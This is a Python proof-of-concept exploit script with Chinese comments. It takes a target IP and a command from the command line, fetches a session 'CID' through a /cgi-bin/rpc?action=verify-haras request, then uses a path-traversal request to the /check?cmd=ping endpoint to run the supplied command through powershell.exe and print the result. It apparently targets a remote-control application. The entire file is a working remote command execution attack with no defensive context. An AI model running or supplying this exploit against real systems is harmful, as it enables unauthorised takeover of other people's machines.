import requests,sys



ip = sys.argv[1] #从外部输入IP地址和端口

command = sys.argv[2] #从外部输入需要执行的命令

payload1 = "/cgi-bin/rpc?action=verify-haras"               #获取CID的请求

payload2 = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+"             #进行攻击的请求

headers = {

    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'

} #请求头



host = "http://" + ip #构造URL



try:

    s = requests.Session()

    #proxies = {'http':'127.0.0.1:8080'} #设置代理

    res = s.get(url=host + payload1,headers=headers,timeout=5) #proxies=proxies 使用payload1获取带有CID的报文

    if res.status_code == 200:

        res = res.json() #获取返回结果

        Cid = res['verify_string'] #从返回结果中获取CID

        headers.update({'Cookie':"CID=" + Cid}) #使用CID拼接Cookie的值

        res1 = s.get(url=host + payload2 + command,headers=headers,timeout=5) #proxies=proxies 使用payload2进行攻击请求

        res1.encoding = "GBK"   #将请求结果进行GBK编码

        print(res1.text) #输出结果

    else:

        pass

except Exception as e:

    print(e)